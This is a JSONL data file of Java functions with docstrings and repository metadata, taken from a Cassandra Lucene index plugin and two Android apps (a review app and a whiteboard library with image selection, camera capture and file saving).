{"docstring": "// \u5224\u65ad\u662f\u5426\u7f3a\u5c11\u6743\u9650\n", "func_signal": "private boolean lacksPermission(String permission)", "code": "{\n    return ContextCompat.checkSelfPermission(mContext, permission) ==\n            PackageManager.PERMISSION_DENIED;\n}", "path": "app\\src\\main\\java\\com\\vv\\androidreview\\utils\\PermissionsChecker.java", "repo_name": "envyfan/AndroidReview", "stars": 715, "license": "gpl-3.0", "language": "java", "size": 8850}
{"docstring": "/**\n * \u7ed3\u675f\u6240\u6709Activity\n */\n", "func_signal": "public void finishAllActivity()", "code": "{\n    for (int i = 0, size = activityStack.size(); i < size; i++) {\n        if (null != activityStack.get(i)) {\n            finishActivity(activityStack.get(i));\n            break;\n        }\n    }\n    activityStack.clear();\n}", "path": "app\\src\\main\\java\\com\\vv\\androidreview\\base\\system\\AppManager.java", "repo_name": "envyfan/AndroidReview", "stars": 715, "license": "gpl-3.0", "language": "java", "size": 8850}
{"docstring": "/** {@inheritDoc} */\n", "func_signal": "@Override\nprotected String doBase(String name, Object value)", "code": "{\n    if (value instanceof InetAddress) {\n        return ((InetAddress) value).getHostAddress();\n    } else if (value instanceof String) {\n        return doBase(name, (String) value);\n    } else {\n        throw new IndexException(\"Field '{}' requires an inet address, but found '{}'\", name, value);\n    }\n}", "path": "plugin\\src\\main\\java\\com\\stratio\\cassandra\\lucene\\schema\\mapping\\InetMapper.java", "repo_name": "Stratio/cassandra-lucene-index", "stars": 596, "license": "apache-2.0", "language": "java", "size": 11040}
{"docstring": "/**\n * Adds the specified sorting fields.\n *\n * @param builders the sorting fields to be added\n * @return this builder with the specified sorting fields\n */\n", "func_signal": "public SearchBuilder sort(SortFieldBuilder... builders)", "code": "{\n    sort.addAll(Arrays.asList(builders));\n    return this;\n}", "path": "plugin\\src\\main\\java\\com\\stratio\\cassandra\\lucene\\search\\SearchBuilder.java", "repo_name": "Stratio/cassandra-lucene-index", "stars": 596, "license": "apache-2.0", "language": "java", "size": 11040}
{"docstring": "/**\n * Sets the date pattern to be used both for columns and fields.\n *\n * @param pattern a {@link java.text.SimpleDateFormat} date pattern\n * @return this\n */\n", "func_signal": "public DateRangeMapperBuilder pattern(String pattern)", "code": "{\n    this.pattern = pattern;\n    return this;\n}", "path": "plugin\\src\\main\\java\\com\\stratio\\cassandra\\lucene\\schema\\mapping\\builder\\DateRangeMapperBuilder.java", "repo_name": "Stratio/cassandra-lucene-index", "stars": 596, "license": "apache-2.0", "language": "java", "size": 11040}
{"docstring": "/** {@inheritDoc} */\n", "func_signal": "@Override\n@SuppressWarnings(\"unchecked\")\npublic final Query doQuery(Schema schema)", "code": "{\n    Mapper mapper = schema.mapper(field);\n    if (mapper == null) {\n        throw new IndexException(\"No mapper found for field '{}'\", field);\n    } else if (!SingleColumnMapper.class.isAssignableFrom(mapper.getClass())) {\n        throw new IndexException(\"Field '{}' requires a mapper of type '{}' but found '{}'\",\n                                 field,\n                                 SingleColumnMapper.class.getSimpleName(),\n                                 mapper);\n    }\n    return doQuery((SingleColumnMapper<?>) mapper, schema.analyzer);\n}", "path": "plugin\\src\\main\\java\\com\\stratio\\cassandra\\lucene\\search\\condition\\SingleColumnCondition.java", "repo_name": "Stratio/cassandra-lucene-index", "stars": 596, "license": "apache-2.0", "language": "java", "size": 11040}
{"docstring": "/**\n * Sets the min allowed distance.\n *\n * @param minDistance the min allowed distance\n * @return this\n */\n", "func_signal": "public GeoDistanceCondition minDistance(String minDistance)", "code": "{\n    this.minDistance = minDistance;\n    return this;\n}", "path": "builder\\src\\main\\java\\com\\stratio\\cassandra\\lucene\\builder\\search\\condition\\GeoDistanceCondition.java", "repo_name": "Stratio/cassandra-lucene-index", "stars": 596, "license": "apache-2.0", "language": "java", "size": 11040}
{"docstring": "/**\n * Returns the {@link SearchBuilder} represented by the specified JSON {@code String}.\n *\n * @param json the JSON {@code String} representing a {@link SearchBuilder}\n * @return the {@link SearchBuilder} represented by the specified JSON {@code String}\n */\n", "func_signal": "public static SearchBuilder fromJson(String json)", "code": "{\n    try {\n        return JsonSerializer.fromString(json, SearchBuilder.class);\n    } catch (IOException e) {\n        return SearchBuilderLegacy.fromJson(json);\n    }\n}", "path": "plugin\\src\\main\\java\\com\\stratio\\cassandra\\lucene\\search\\SearchBuilder.java", "repo_name": "Stratio/cassandra-lucene-index", "stars": 596, "license": "apache-2.0", "language": "java", "size": 11040}
{"docstring": "/**\n * Adds a new {@link Mapper}.\n *\n * @param field the name of the {@link Mapper} to be added\n * @param mapper the {@link Mapper} to be added\n * @return this with the specified mapper\n */\n", "func_signal": "public Schema mapper(String field, Mapper mapper)", "code": "{\n    if (mappers == null) {\n        mappers = new LinkedHashMap<>();\n    }\n    mappers.put(field, mapper);\n    return this;\n}", "path": "builder\\src\\main\\java\\com\\stratio\\cassandra\\lucene\\builder\\index\\schema\\Schema.java", "repo_name": "Stratio/cassandra-lucene-index", "stars": 596, "license": "apache-2.0", "language": "java", "size": 11040}
{"docstring": "/**\n * Sets if the {@link Search} to be built must refresh the index before reading it. Refresh is a costly operation so\n * you should use it only when it is strictly required.\n *\n * @param refresh {@code true} if the {@link Search} to be built must refresh the Lucene's index searcher before\n * searching, {@code false} otherwise\n * @return this builder with the specified refresh\n */\n", "func_signal": "public SearchBuilder refresh(boolean refresh)", "code": "{\n    this.refresh = refresh;\n    return this;\n}", "path": "plugin\\src\\main\\java\\com\\stratio\\cassandra\\lucene\\search\\SearchBuilder.java", "repo_name": "Stratio/cassandra-lucene-index", "stars": 596, "license": "apache-2.0", "language": "java", "size": 11040}
{"docstring": "/**\n * Returns the {@link Search} represented by this builder.\n *\n * @return the search represented by this builder\n */\n", "func_signal": "@Override\npublic Search build()", "code": "{\n    return new Search(filter.stream().map(ConditionBuilder::build).collect(toList()),\n                      query.stream().map(ConditionBuilder::build).collect(toList()),\n                      sort.stream().map(SortFieldBuilder::build).collect(toList()),\n                      paging == null ? null : IndexPagingState.fromByteBuffer(ByteBufferUtils.byteBuffer(paging)),\n                      refresh);\n}", "path": "plugin\\src\\main\\java\\com\\stratio\\cassandra\\lucene\\search\\SearchBuilder.java", "repo_name": "Stratio/cassandra-lucene-index", "stars": 596, "license": "apache-2.0", "language": "java", "size": 11040}
{"docstring": "/**\n * Returns a new {@link GeoDistanceCondition} with the specified field reference point.\n *\n * @param field the name of the field to be matched\n * @param latitude the latitude of the reference point\n * @param longitude the longitude of the reference point\n * @param maxDistance the max allowed distance\n */\n", "func_signal": "@JsonCreator\npublic GeoDistanceCondition(@JsonProperty(\"field\") String field,\n                            @JsonProperty(\"latitude\") double latitude,\n                            @JsonProperty(\"longitude\") double longitude,\n                            @JsonProperty(\"max_distance\") String maxDistance)", "code": "{\n    this.field = field;\n    this.longitude = longitude;\n    this.latitude = latitude;\n    this.maxDistance = maxDistance;\n}", "path": "builder\\src\\main\\java\\com\\stratio\\cassandra\\lucene\\builder\\search\\condition\\GeoDistanceCondition.java", "repo_name": "Stratio/cassandra-lucene-index", "stars": 596, "license": "apache-2.0", "language": "java", "size": 11040}
{"docstring": "/**\n * Returns this builder with the specified filtering conditions not participating in scoring.\n *\n * @param builders the conditions to be added\n * @return this builder with the specified conditions\n */\n", "func_signal": "public SearchBuilder filter(ConditionBuilder<?, ?>... builders)", "code": "{\n    filter.addAll(Arrays.asList(builders));\n    return this;\n}", "path": "plugin\\src\\main\\java\\com\\stratio\\cassandra\\lucene\\search\\SearchBuilder.java", "repo_name": "Stratio/cassandra-lucene-index", "stars": 596, "license": "apache-2.0", "language": "java", "size": 11040}
{"docstring": "/**\n * Creates a new {@link GeoDistanceSortField} for the specified field and reverse option.\n *\n * @param field the name of the geo point field mapper to be used for sorting\n * @param latitude the latitude in degrees of the reference point\n * @param longitude the longitude in degrees of the reference point\n */\n", "func_signal": "@JsonCreator\npublic GeoDistanceSortField(@JsonProperty(\"field\") String field,\n                            @JsonProperty(\"latitude\") double latitude,\n                            @JsonProperty(\"longitude\") double longitude)", "code": "{\n    this.field = field;\n    this.latitude = latitude;\n    this.longitude = longitude;\n}", "path": "builder\\src\\main\\java\\com\\stratio\\cassandra\\lucene\\builder\\search\\sort\\GeoDistanceSortField.java", "repo_name": "Stratio/cassandra-lucene-index", "stars": 596, "license": "apache-2.0", "language": "java", "size": 11040}
{"docstring": "/**\n * Adds a new {@link Analyzer}.\n *\n * @param name the name of the {@link Analyzer} to be added\n * @param analyzer the {@link Analyzer} to be added\n * @return this with the specified analyzer\n */\n", "func_signal": "public Schema analyzer(String name, Analyzer analyzer)", "code": "{\n    if (analyzers == null) {\n        analyzers = new LinkedHashMap<>();\n    }\n    analyzers.put(name, analyzer);\n    return this;\n}", "path": "builder\\src\\main\\java\\com\\stratio\\cassandra\\lucene\\builder\\index\\schema\\Schema.java", "repo_name": "Stratio/cassandra-lucene-index", "stars": 596, "license": "apache-2.0", "language": "java", "size": 11040}
{"docstring": "/**\n * Sets the name of the default {@link Analyzer}.\n *\n * @param name the name of the default {@link Analyzer}\n * @return this with the specified default analyzer\n */\n", "func_signal": "public Schema defaultAnalyzer(String name)", "code": "{\n    defaultAnalyzerName = name;\n    return this;\n}", "path": "builder\\src\\main\\java\\com\\stratio\\cassandra\\lucene\\builder\\index\\schema\\Schema.java", "repo_name": "Stratio/cassandra-lucene-index", "stars": 596, "license": "apache-2.0", "language": "java", "size": 11040}
{"docstring": "/**\n * Sets the specified starting partition key.\n *\n * @param pagingState a paging state\n * @return this builder with the specified partition key\n */\n", "func_signal": "public SearchBuilder paging(IndexPagingState pagingState)", "code": "{\n    this.paging = ByteBufferUtils.toHex(pagingState.toByteBuffer());\n    return this;\n}", "path": "plugin\\src\\main\\java\\com\\stratio\\cassandra\\lucene\\search\\SearchBuilder.java", "repo_name": "Stratio/cassandra-lucene-index", "stars": 596, "license": "apache-2.0", "language": "java", "size": 11040}
{"docstring": "/**\n * Sets the boost to be used.\n *\n * @param boost the boost\n * @return this with the specified boost\n */\n", "func_signal": "public LongMapper boost(Float boost)", "code": "{\n    this.boost = boost;\n    return this;\n}", "path": "builder\\src\\main\\java\\com\\stratio\\cassandra\\lucene\\builder\\index\\schema\\mapping\\LongMapper.java", "repo_name": "Stratio/cassandra-lucene-index", "stars": 596, "license": "apache-2.0", "language": "java", "size": 11040}
{"docstring": "/**\n * Returns the JSON representation of this object.\n *\n * @return a JSON representation of this object\n */\n", "func_signal": "public String toJson()", "code": "{\n    build();\n    try {\n        return JsonSerializer.toString(this);\n    } catch (IOException e) {\n        throw new IndexException(e, \"Unformateable JSON search: {}\", e.getMessage());\n    }\n}", "path": "plugin\\src\\main\\java\\com\\stratio\\cassandra\\lucene\\search\\SearchBuilder.java", "repo_name": "Stratio/cassandra-lucene-index", "stars": 596, "license": "apache-2.0", "language": "java", "size": 11040}
{"docstring": "/**\n * Builds a new {@link SingleColumnMapper} supporting the specified types for indexing and clustering.\n *\n * @param field the name of the field\n * @param validated if the field must be validated\n * @param mappedColumns the names of the columns to be mapped\n * @param supportedTypes the supported column value data types\n */\n", "func_signal": "public MultipleColumnMapper(String field,\n                            Boolean validated,\n                            List<String> mappedColumns,\n                            List<Class<?>> supportedTypes)", "code": "{\n    super(field,\n          false,\n          validated,\n          null,\n          mappedColumns,\n          supportedTypes,\n          EMPTY_TYPE_LIST,\n          false);\n}", "path": "plugin\\src\\main\\java\\com\\stratio\\cassandra\\lucene\\schema\\mapping\\MultipleColumnMapper.java", "repo_name": "Stratio/cassandra-lucene-index", "stars": 596, "license": "apache-2.0", "language": "java", "size": 11040}
{"docstring": "/**\n * Returns this builder with the specified querying conditions participating in scoring.\n *\n * @param builders the conditions to be added\n * @return this builder with the specified conditions\n */\n", "func_signal": "public SearchBuilder query(ConditionBuilder<?, ?>... builders)", "code": "{\n    query.addAll(Arrays.asList(builders));\n    return this;\n}", "path": "plugin\\src\\main\\java\\com\\stratio\\cassandra\\lucene\\search\\SearchBuilder.java", "repo_name": "Stratio/cassandra-lucene-index", "stars": 596, "license": "apache-2.0", "language": "java", "size": 11040}
{"docstring": "/**\n * Builds a new {@link SingleColumnMapper} supporting the specified types for indexing and clustering.\n *\n * @param field the name of the field\n * @param validated if the field must be validated\n * @param mappedColumns the names of the columns to be mapped\n * @param supportedTypes the supported column value data types\n * @param excludedTypes the explicitly excluded value data types\n */\n", "func_signal": "public MultipleColumnMapper(String field,\n                            Boolean validated,\n                            List<String> mappedColumns,\n                            List<Class<?>> supportedTypes,\n                            List<Class<?>> excludedTypes )", "code": "{\n    super(field,\n          false,\n          validated,\n          null,\n          mappedColumns,\n          supportedTypes,\n          excludedTypes,\n          false);\n}", "path": "plugin\\src\\main\\java\\com\\stratio\\cassandra\\lucene\\schema\\mapping\\MultipleColumnMapper.java", "repo_name": "Stratio/cassandra-lucene-index", "stars": 596, "license": "apache-2.0", "language": "java", "size": 11040}
{"docstring": "/**\n * \u8bf7\u6c42 \u5199\u5165sd\u5361\u6743\u9650\n * @param permission\n * @param rationale\n * @param requestCode\n */\n", "func_signal": "private void requestPermission(final String permission, String rationale, final int requestCode)", "code": "{\n    if (shouldShowRequestPermissionRationale(permission)) {\n        new AlertDialog.Builder(getContext())\n                .setTitle(R.string.permission_dialog_title)\n                .setMessage(rationale)\n                .setPositiveButton(R.string.permission_dialog_ok, new DialogInterface.OnClickListener() {\n                    @Override\n                    public void onClick(DialogInterface dialog, int which) {\n                        requestPermissions(new String[]{permission}, requestCode);\n                    }\n                })\n                .setNegativeButton(R.string.permission_dialog_cancel, null)\n                .create().show();\n    } else {\n        requestPermissions(new String[]{permission}, requestCode);\n    }\n}", "path": "whiteboardlib\\src\\main\\java\\com\\yinghe\\whiteboardlib\\MultiImageSelectorFragment.java", "repo_name": "dsbGenius/WhiteBoard", "stars": 581, "license": "None", "language": "java", "size": 21885}
{"docstring": "/**\n * show \u65b0\u589e\u56fe\u7247\u5230\u5f53\u524d\u767d\u677f\n * @param imgPath \u65b0\u589e\u7684\u56fe\u7247\u8def\u5f84\n * @author TangentLu\n * create at 16/6/21 \u4e0b\u53483:42\n */\n", "func_signal": "public void addPhotoByPath(String imgPath)", "code": "{\n    showSketchView(true);\n    mSketchView.addPhotoByPath(imgPath);\n    mSketchView.setEditMode(SketchView.EDIT_PHOTO);//\u5207\u6362\u56fe\u7247\u7f16\u8f91\u6a21\u5f0f\n}", "path": "whiteboardlib\\src\\main\\java\\com\\yinghe\\whiteboardlib\\fragment\\WhiteBoardFragment.java", "repo_name": "dsbGenius/WhiteBoard", "stars": 581, "license": "None", "language": "java", "size": 21885}
{"docstring": "/**\n * show \u4fdd\u5b58\u56fe\u7247\u5230\u672c\u5730\u6587\u4ef6\uff0c\u8017\u65f6\u64cd\u4f5c\n * @param filePath \u6587\u4ef6\u4fdd\u5b58\u8def\u5f84\n * @param imgName  \u6587\u4ef6\u540d\n * @param compress \u538b\u7f29\u767e\u5206\u6bd41-100\n * @return \u8fd4\u56de\u4fdd\u5b58\u7684\u56fe\u7247\u6587\u4ef6\n * @author TangentLu\n * create at 16/6/17 \u4e0a\u534811:18\n */\n", "func_signal": "public File saveInOI(String filePath, String imgName, int compress)", "code": "{\n    if (!imgName.contains(\".png\")) {\n        imgName += \".png\";\n    }\n    Log.e(TAG, \"saveInOI: \" + System.currentTimeMillis());\n    Bitmap newBM = mSketchView.getResultBitmap();\n    Log.e(TAG, \"saveInOI: \" + System.currentTimeMillis());\n\n    try {\n        File dir = new File(filePath);\n        if (!dir.exists()) {\n            dir.mkdirs();\n        }\n        File f = new File(filePath, imgName);\n        if (!f.exists()) {\n            f.createNewFile();\n        } else {\n            f.delete();\n        }\n        FileOutputStream out = new FileOutputStream(f);\n        Log.e(TAG, \"saveInOI: \" + System.currentTimeMillis());\n\n        if (compress >= 1 && compress <= 100)\n            newBM.compress(Bitmap.CompressFormat.PNG, compress, out);\n        else {\n            newBM.compress(Bitmap.CompressFormat.PNG, 80, out);\n        }\n        Log.e(TAG, \"saveInOI: \" + System.currentTimeMillis());\n\n        out.close();\n        newBM.recycle();\n        newBM = null;\n        return f;\n    } catch (Exception e) {\n        return null;\n    }\n}", "path": "whiteboardlib\\src\\main\\java\\com\\yinghe\\whiteboardlib\\fragment\\WhiteBoardFragment.java", "repo_name": "dsbGenius/WhiteBoard", "stars": 581, "license": "None", "language": "java", "size": 21885}
{"docstring": "/**\n * Update done button by select image data\n *\n * @param resultList selected image data\n */\n", "func_signal": "private void updateDoneText(ArrayList<String> resultList)", "code": "{\n    int size = 0;\n    if (resultList == null || resultList.size() <= 0) {\n        mSubmitButton.setText(R.string.action_done);\n        mSubmitButton.setEnabled(false);\n    } else {\n        size = resultList.size();\n        mSubmitButton.setEnabled(true);\n    }\n    mSubmitButton.setText(getString(R.string.action_button_string,\n            getString(R.string.action_done), size, mDefaultCount));\n}", "path": "whiteboardlib\\src\\main\\java\\com\\yinghe\\whiteboardlib\\MultiImageSelectorActivity.java", "repo_name": "dsbGenius/WhiteBoard", "stars": 581, "license": "None", "language": "java", "size": 21885}
{"docstring": "/**\n * \u83b7\u53d6\u72b6\u6001\u680f\u9ad8\u5ea6\n */\n", "func_signal": "public static int getStatusBarHeight(Context context)", "code": "{\n    Class<?> c = null;\n    Object obj = null;\n    Field field = null;\n    int x = 0, sbar = 0;\n    try {\n        c = Class.forName(\"com.android.internal.R$dimen\");\n        obj = c.newInstance();\n        field = c.getField(\"status_bar_height\");\n        x = Integer.parseInt(field.get(obj).toString());\n        sbar = context.getResources().getDimensionPixelSize(x);\n    } catch (Exception e1) {\n        Log.e(\"getStatusBarHight()\", \"get status bar height fail\");\n        e1.printStackTrace();\n    }\n    int statusBarHeight = sbar;\n    Log.i(\"onPreDraw\", \"statusBarHeight: \"+statusBarHeight);\n    return statusBarHeight;\n}", "path": "whiteboardlib\\src\\main\\java\\com\\yinghe\\whiteboardlib\\Utils\\ScreenUtils.java", "repo_name": "dsbGenius/WhiteBoard", "stars": 581, "license": "None", "language": "java", "size": 21885}
{"docstring": "/**\n * \u901a\u8fc7\u56fe\u7247\u8def\u5f84\u8bbe\u7f6e\u9ed8\u8ba4\u9009\u62e9\n *\n * @param resultList\n */\n", "func_signal": "public void setDefaultSelected(ArrayList<String> resultList)", "code": "{\n    for (String path : resultList) {\n        Image image = getImageByPath(path);\n        if (image != null) {\n            mSelectedImages.add(image);\n        }\n    }\n    if (mSelectedImages.size() > 0) {\n        notifyDataSetChanged();\n    }\n}", "path": "whiteboardlib\\src\\main\\java\\com\\yinghe\\whiteboardlib\\adapter\\ImageGridAdapter.java", "repo_name": "dsbGenius/WhiteBoard", "stars": 581, "license": "None", "language": "java", "size": 21885}
{"docstring": "/**\n * \u5c4f\u5e55\u65cb\u8f6c\u65f6\u4e5f\u9700\u8981\u8c03\u6574activity\u7684\u5927\u5c0f\n *\n * @param newConfig\n */\n", "func_signal": "@Override\npublic void onConfigurationChanged(Configuration newConfig)", "code": "{\n    super.onConfigurationChanged(newConfig);\n    int orientation = newConfig.orientation;\n//        setActivitySize(orientation);\n}", "path": "whiteboardlib\\src\\main\\java\\com\\yinghe\\whiteboardlib\\MultiImageSelectorActivity.java", "repo_name": "dsbGenius/WhiteBoard", "stars": 581, "license": "None", "language": "java", "size": 21885}
{"docstring": "/**\n * Create popup ListView\n */\n", "func_signal": "private void createPopupFolderList()", "code": "{\n//        Point point = ScreenUtils.getScreenSize(getActivity());\n////        int width = point.x;\n//        int width =getActivity().getWindow().getDecorView().getWidth()- DensityUtil.dip2px(getActivity(),60);\n//        int height = (int) (point.y * (4.5f/8.0f));\n    int orientation = this.getResources().getConfiguration().orientation;\n    mFolderPopupWindow = new ListPopupWindow(getActivity());\n    mFolderPopupWindow.setBackgroundDrawable(new ColorDrawable(Color.WHITE));\n    mFolderPopupWindow.setAdapter(mFolderAdapter);\n//        mFolderPopupWindow.setContentWidth(width);\n//        mFolderPopupWindow.setWidth(width);\n//        mFolderPopupWindow.setHeight(height);\n    setPopupWindowSize(orientation);\n    mFolderPopupWindow.setAnchorView(mPopupAnchorView);\n    mFolderPopupWindow.setModal(true);\n    mFolderPopupWindow.setOnItemClickListener(new AdapterView.OnItemClickListener() {\n        @Override\n        public void onItemClick(AdapterView<?> adapterView, View view, int i, long l) {\n\n            mFolderAdapter.setSelectIndex(i);\n\n            final int index = i;\n            final AdapterView TempAdapterView = adapterView;\n\n            new Handler().postDelayed(new Runnable() {\n                @Override\n                public void run() {\n                    mFolderPopupWindow.dismiss();\n\n                    if (index == getAllPicIndex()) {\n                        getActivity().getSupportLoaderManager().restartLoader(LOADER_ALL, null, mLoaderCallback);\n                        mCategoryText.setText(R.string.folder_all);\n                        if (showCamera()) {\n                            mImageAdapter.setShowCamera(true);\n                        } else {\n                            mImageAdapter.setShowCamera(false);\n                        }\n                    } else {\n                        Folder folder = (Folder) TempAdapterView.getAdapter().getItem(index);\n                        if (null != folder) {\n                            mImageAdapter.setData(folder.images);\n                            mCategoryText.setText(folder.name);\n                            if (resultList != null && resultList.size() > 0) {\n                                mImageAdapter.setDefaultSelected(resultList);\n                            }\n                        }\n                        mImageAdapter.setShowCamera(false);\n                    }\n\n                    mImageGridView.smoothScrollToPosition(0);\n                }\n            }, 100);\n\n        }\n    });\n}", "path": "whiteboardlib\\src\\main\\java\\com\\yinghe\\whiteboardlib\\MultiImageSelectorFragment.java", "repo_name": "dsbGenius/WhiteBoard", "stars": 581, "license": "None", "language": "java", "size": 21885}
{"docstring": "/**\n * notify callback\n *\n * @param image image data\n */\n", "func_signal": "private void selectImageFromGrid(Image image, int mode)", "code": "{\n    if (image != null) {\n        if (mode == MODE_MULTI) {\n            if (resultList.contains(image.path)) {\n                resultList.remove(image.path);\n                if (mCallback != null) {\n                    mCallback.onImageUnselected(image.path);\n                }\n            } else {\n                if (selectImageCount() == resultList.size()) {\n                    Toast.makeText(getActivity(), R.string.msg_amount_limit, Toast.LENGTH_SHORT).show();\n                    return;\n                }\n                resultList.add(image.path);\n                if (mCallback != null) {\n                    mCallback.onImageSelected(image.path);\n                }\n            }\n            mImageAdapter.select(image);\n        } else if (mode == MODE_SINGLE) {\n            if (mCallback != null) {\n                mCallback.onSingleImageSelected(image.path);\n            }\n        }\n    }\n}", "path": "whiteboardlib\\src\\main\\java\\com\\yinghe\\whiteboardlib\\MultiImageSelectorFragment.java", "repo_name": "dsbGenius/WhiteBoard", "stars": 581, "license": "None", "language": "java", "size": 21885}
{"docstring": "/**\n * Open camera\n */\n", "func_signal": "private void showCameraAction()", "code": "{\n    if (ContextCompat.checkSelfPermission(getContext(), Manifest.permission.WRITE_EXTERNAL_STORAGE)\n            != PackageManager.PERMISSION_GRANTED) {\n        requestPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE,\n                getString(R.string.permission_rationale_write_storage),\n                REQUEST_STORAGE_WRITE_ACCESS_PERMISSION);\n    } else {\n        Intent intent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);\n        if (intent.resolveActivity(getActivity().getPackageManager()) != null) {\n            try {\n                mTmpFile = FileUtils.createTmpFile(getActivity());\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n            if (mTmpFile != null && mTmpFile.exists()) {\n                intent.putExtra(MediaStore.EXTRA_OUTPUT, Uri.fromFile(mTmpFile));\n                startActivityForResult(intent, REQUEST_CAMERA);\n            } else {\n                Toast.makeText(getActivity(), R.string.error_image_not_exist, Toast.LENGTH_SHORT).show();\n            }\n        } else {\n            Toast.makeText(getActivity(), R.string.msg_no_camera, Toast.LENGTH_SHORT).show();\n        }\n    }\n}", "path": "whiteboardlib\\src\\main\\java\\com\\yinghe\\whiteboardlib\\MultiImageSelectorFragment.java", "repo_name": "dsbGenius/WhiteBoard", "stars": 581, "license": "None", "language": "java", "size": 21885}
{"docstring": "/**\n * @param imgPath \u6dfb\u52a0\u7684\u80cc\u666f\u56fe\u7247\u6587\u4ef6\u8def\u5f84\n * @author TangentLu\n * create at 16/6/21 \u4e0b\u53483:39\n * show \u8bbe\u7f6e\u5f53\u524d\u767d\u677f\u7684\u80cc\u666f\u56fe\u7247\n */\n", "func_signal": "public void setCurBackgroundByPath(String imgPath)", "code": "{\n    showSketchView(true);\n    mSketchView.setBackgroundByPath(imgPath);\n}", "path": "whiteboardlib\\src\\main\\java\\com\\yinghe\\whiteboardlib\\fragment\\WhiteBoardFragment.java", "repo_name": "dsbGenius/WhiteBoard", "stars": 581, "license": "None", "language": "java", "size": 21885}
{"docstring": "/**\n * \u8bbe\u7f6e\u6570\u636e\u96c6\n *\n * @param images\n */\n", "func_signal": "public void setData(List<Image> images)", "code": "{\n    mSelectedImages.clear();\n\n    if (images != null && images.size() > 0) {\n        mImages = images;\n    } else {\n        mImages.clear();\n    }\n    notifyDataSetChanged();\n}", "path": "whiteboardlib\\src\\main\\java\\com\\yinghe\\whiteboardlib\\adapter\\ImageGridAdapter.java", "repo_name": "dsbGenius/WhiteBoard", "stars": 581, "license": "None", "language": "java", "size": 21885}
{"docstring": "/**\n * \u8c03\u7528\u7cfb\u7edf\u7684\u88c1\u526a\n *\n * @param uri\n */\n", "func_signal": "public void cropPhoto(Uri uri)", "code": "{\n    Intent intent = new Intent(\"com.android.camera.action.CROP\");\n    intent.setDataAndType(uri, \"image/*\");\n    intent.putExtra(\"crop\", \"true\");\n    // aspectX aspectY \u662f\u5bbd\u9ad8\u7684\u6bd4\u4f8b\n    intent.putExtra(\"aspectX\", 1);\n    intent.putExtra(\"aspectY\", 1);\n    // outputX outputY \u662f\u88c1\u526a\u56fe\u7247\u5bbd\u9ad8\n    intent.putExtra(\"outputX\", 150);\n    intent.putExtra(\"outputY\", 150);\n    intent.putExtra(\"return-data\", true);\n    startActivityForResult(intent, REQUEST_CROP);\n}", "path": "whiteboardlib\\src\\main\\java\\com\\yinghe\\whiteboardlib\\MultiImageSelectorFragment.java", "repo_name": "dsbGenius/WhiteBoard", "stars": 581, "license": "None", "language": "java", "size": 21885}
{"docstring": "/**\n * \u5c06\u88c1\u526a\u540e\u7684\u56fe\u7247\u4fdd\u5b58\u5230\u672c\u5730\u4ee5\u53ca\u56de\u8c03\u5230\u753b\u677f\u4e2d\n * @param bitmap\n */\n", "func_signal": "private void dealWithBitmap(Bitmap bitmap)", "code": "{\n    if (bitmap != null) {\n        String sdStatus = Environment.getExternalStorageState();\n        if (!sdStatus.equals(Environment.MEDIA_MOUNTED)) { // \u68c0\u6d4bsd\u662f\u5426\u53ef\u7528\n            return;\n        }\n        FileOutputStream b = null;\n        String path = Environment.getExternalStorageDirectory().getPath()+\"/whiteBoardLib/\";\n        File file = new File(path);\n        file.mkdirs();// \u521b\u5efa\u6587\u4ef6\u5939\n        String fileName = path + UUID.randomUUID() + \".jpg\";// \u56fe\u7247\u540d\u5b57\n        try {\n            b = new FileOutputStream(fileName);\n            bitmap.compress(Bitmap.CompressFormat.JPEG, 100, b);// \u628a\u6570\u636e\u5199\u5165\u6587\u4ef6\n\n        } catch (FileNotFoundException e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                // \u5173\u95ed\u6d41\n                b.flush();\n                b.close();\n                if (mCallback != null) {\n                    File imgFile = new File(fileName);\n                    mCallback.onCameraShot(imgFile);\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n\n        }\n\n    }\n}", "path": "whiteboardlib\\src\\main\\java\\com\\yinghe\\whiteboardlib\\MultiImageSelectorFragment.java", "repo_name": "dsbGenius/WhiteBoard", "stars": 581, "license": "None", "language": "java", "size": 21885}
{"docstring": "/**\n * \u9009\u62e9\u67d0\u4e2a\u56fe\u7247\uff0c\u6539\u53d8\u9009\u62e9\u72b6\u6001\n *\n * @param image\n */\n", "func_signal": "public void select(Image image)", "code": "{\n    if (mSelectedImages.contains(image)) {\n        mSelectedImages.remove(image);\n    } else {\n        mSelectedImages.add(image);\n    }\n    notifyDataSetChanged();\n}", "path": "whiteboardlib\\src\\main\\java\\com\\yinghe\\whiteboardlib\\adapter\\ImageGridAdapter.java", "repo_name": "dsbGenius/WhiteBoard", "stars": 581, "license": "None", "language": "java", "size": 21885}
{"docstring": "/**\n * show  \u65b0\u589e\u767d\u677f\u5e76\u8bbe\u7f6e\u767d\u677f\u7684\u80cc\u666f\u56fe\u7247\n * @param imgPath \u6dfb\u52a0\u7684\u80cc\u666f\u56fe\u7247\u6587\u4ef6\u8def\u5f84\n * @author TangentLu\n * create at 16/6/21 \u4e0b\u53483:39\n */\n", "func_signal": "public void setNewBackgroundByPath(String imgPath)", "code": "{\n    showSketchView(true);\n    SketchData newSketchData = new SketchData();\n    sketchDataList.add(newSketchData);\n    mSketchView.updateSketchData(newSketchData);\n    setCurBackgroundByPath(imgPath);\n    mSketchView.setEditMode(SketchView.EDIT_STROKE);\n}", "path": "whiteboardlib\\src\\main\\java\\com\\yinghe\\whiteboardlib\\fragment\\WhiteBoardFragment.java", "repo_name": "dsbGenius/WhiteBoard", "stars": 581, "license": "None", "language": "java", "size": 21885}
{"docstring": "/**\n *\n * \u662f\u5426\u663e\u793a\u62cd\u7167\n * @return\n */\n", "func_signal": "private boolean showCamera()", "code": "{\n    boolean isShowCamera =getArguments() == null || getArguments().getBoolean(EXTRA_SHOW_CAMERA, true);\n    if (mRequestType== WhiteBoardFragment.REQUEST_IMAGE) {\n        return isShowCamera;\n    } else if (mRequestType == WhiteBoardFragment.REQUEST_BACKGROUND) {\n        return false;\n    }\n    return isShowCamera;\n}", "path": "whiteboardlib\\src\\main\\java\\com\\yinghe\\whiteboardlib\\MultiImageSelectorFragment.java", "repo_name": "dsbGenius/WhiteBoard", "stars": 581, "license": "None", "language": "java", "size": 21885}
